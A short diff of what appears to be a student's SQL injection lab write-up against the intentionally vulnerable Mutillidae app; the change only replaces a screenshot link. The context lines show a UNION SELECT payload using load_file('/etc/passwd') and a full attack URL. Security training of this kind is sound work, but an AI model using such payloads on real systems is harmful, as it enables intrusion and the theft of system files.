@@ -174,7 +174,8 @@ Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 http://192.168.1.7/mutillidae/index.php?page=user-info.php&username=senthil%27union%20select%20null,load_file(%E2%80%98/etc/passwd%E2%80%99),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
 
-![WhatsApp Image 2024-05-10 at 20 15 32_2f3bfa24](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/a38d7cd5-8d7c-4c83-864c-da1eba838b8d)
+![WhatsApp Image 2024-05-10 at 20 15 32_78261b84](https://github.com/Vineesh-AI-DS/sqlinjection/assets/93427254/0ea2a3bf-039c-4f70-9dbf-bc63d73f2c68)
+
 
 
 ## RESULT:
